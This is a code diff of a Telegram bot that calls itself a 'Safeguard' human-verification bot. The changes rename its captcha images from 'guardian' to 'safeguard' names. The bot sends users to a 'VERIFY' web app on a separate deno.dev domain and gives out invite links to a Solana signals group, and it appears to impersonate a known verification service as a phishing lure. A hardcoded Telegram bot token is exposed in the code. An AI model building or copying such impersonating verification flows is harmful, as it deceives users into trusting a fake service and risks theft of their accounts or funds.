@@ -25,9 +25,9 @@ const botOwner = "1117264759";
 const botName = "VerifywithSafeguardrobot";
 const webAppLink = "https://safeguard-webapp2025.deno.dev/";
 const gateKeeper = "7734508293:AAHXJt9rNpDpObZoIXGww6e8kX9Y6oUHin8";
-const sgClickVerifyURL = "guardian_verification.jpg";
-const sgTapToVerifyURL = "guardian_verification_2.jpg";
-const sgVerifiedURL = "guardian_verified.jpg";
+const sgClickVerifyURL = "safeguard-click-verify.jpg";
+const sgTapToVerifyURL = "safeguard-human.jpg";
+const sgVerifiedURL = "safeguard-verify.jpg";
 const DEBUG = true;
 /* #endregion */
 
@@ -53,7 +53,7 @@ bot.chatType("private").command("start", async (ctx) => {
     
 Click 'VERIFY' and complete captcha to gain entry - <a href="https://docs.safeguard.run/group-security/verification-issues"><i>Not working?</i></a>`;
 
-  const sgClickVerify = await Deno.open("./guardian_verification.jpg");
+  const sgClickVerify = await Deno.open("./safeguard-click-verify.jpg");
   const input = new InputFile(sgClickVerifyURL || sgClickVerify);
   const keyboard = new InlineKeyboard().webApp(
     "VERIFY",
@@ -130,7 +130,7 @@ Click below to verify you're human`;
     const entry = await deno.get(["channel", ctx.chat.username || ""]);
     const config = (entry.value || sgConfigDefault) as SafeguardConfig;
 
-    const verifyDefault = await Deno.open("./guardian_verification_2.jpg");
+    const verifyDefault = await Deno.open("./safeguard-human.jpg");
 const groupName = config.name.trim() !== "" ? config.name : "This group";
 
 let input: InputFile;
@@ -139,7 +139,7 @@ if (config.image !== "") {
   const buffer = new Uint8Array(await remoteImage.arrayBuffer());
   input = new InputFile(buffer, "verify.jpg");
 } else {
-  input = new InputFile(await Deno.open("./guardian_verification_2.jpg"));
+  input = new InputFile(await Deno.open("./safeguard-human.jpg"));
 }
 
     const keyboard = new InlineKeyboard().url(
@@ -214,9 +214,9 @@ const newVerified = async (ctx: Context) => {
     const entry = await deno.get(["channel", "@SolanaSignalsPrivate"]);
     const config = (entry.value || sgConfigDefault) as SafeguardConfig;
     config.inviteLink = "https://t.me/+svKf9_oSfW81MTI0";
-const imageResponse = await fetch("https://raw.githubusercontent.com/mazzamassy/complete/refs/heads/main/guardian_verified.jpg");
+const imageResponse = await fetch("https://raw.githubusercontent.com/mazzamassy/complete/refs/heads/main/safeguard-verify.jpg");
 const imageBuffer = new Uint8Array(await imageResponse.arrayBuffer());
-const imageLink = new InputFile(imageBuffer, "guardian_verified.jpg");
+const imageLink = new InputFile(imageBuffer, "safeguard-verify.jpg");
 
     const verifyMsg = `✅ Verified, you can join the group using this temporary link:
 
